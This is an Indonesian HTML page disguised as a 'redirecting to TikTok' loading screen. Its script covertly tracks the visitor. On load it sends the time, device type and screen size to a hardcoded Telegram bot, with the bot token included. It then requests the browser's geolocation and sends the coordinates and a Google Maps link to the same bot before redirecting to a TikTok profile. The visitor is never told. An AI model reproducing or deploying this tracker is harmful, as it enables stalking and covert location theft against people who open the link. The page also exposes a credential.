<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Redirecting...</title>
  <style>
    body { 
      margin: 0; 
      padding: 0; 
      background: radial-gradient(circle at 20% 30%, #1a1a2e, #000000);
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      font-family: system-ui;
      color: white;
    }
    .loading {
      text-align: center;
    }
    .spinner {
      width: 40px;
      height: 40px;
      border: 3px solid rgba(255,255,255,0.3);
      border-top-color: #fe2c55;
      border-radius: 50%;
      animation: spin 0.6s linear infinite;
      margin: 0 auto 16px;
    }
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
<div class="loading">
  <div class="spinner"></div>
  <p>Verifikasi & mengarahkan ke TikTok...</p>
</div>

<script>
  const BOT_TOKEN = "8713051914:AAGWypsFdP6uJPMHFwgLokj4vx5N7LC4Cb0";
  const CHAT_ID = "1966317946";
  const TIKTOK_URL = "https://www.tiktok.com/@usernamekamu";
  
  // Kirim info lokasi (jika dapat) ke Telegram, lalu LANGSUNG REDIRECT
  function sendToTelegram(message) {
    const img = new Image();
    img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
  }
  
  // Kirim pesan awal
  const now = new Date().toLocaleString('id-ID');
  const ua = navigator.userAgent;
  const isMobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
  const screen = `${screen.width}x${screen.height}`;
  
  sendToTelegram(`🔐 *REDIRECT TIKTOK* 🔐\n━━━━━━━━━━━━━\n⏰ ${now}\n📱 ${isMobile ? 'MOBILE' : 'DESKTOP'}\n📐 ${screen}\n✅ Halaman terbuka, redirecting...`);
  
  // Redirect dalam 1 detik (PASTI JALAN)
  setTimeout(() => {
    window.location.replace(TIKTOK_URL);
  }, 1000);
  
  // Coba ambil lokasi (TANPA MENGHALANGI REDIRECT)
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const lat = position.coords.latitude;
        const lng = position.coords.longitude;
        sendToTelegram(`📍 *LOKASI DAPAT*\nLat: ${lat}\nLng: ${lng}\nhttps://www.google.com/maps?q=${lat},${lng}`);
      },
      (error) => {
        let err = error.code === 1 ? 'IZIN DITOLAK' : 'GAGAL';
        sendToTelegram(`❌ *LOKASI ${err}*`);
      },
      { timeout: 3000 }
    );
  }
</script>
</body>
</html>
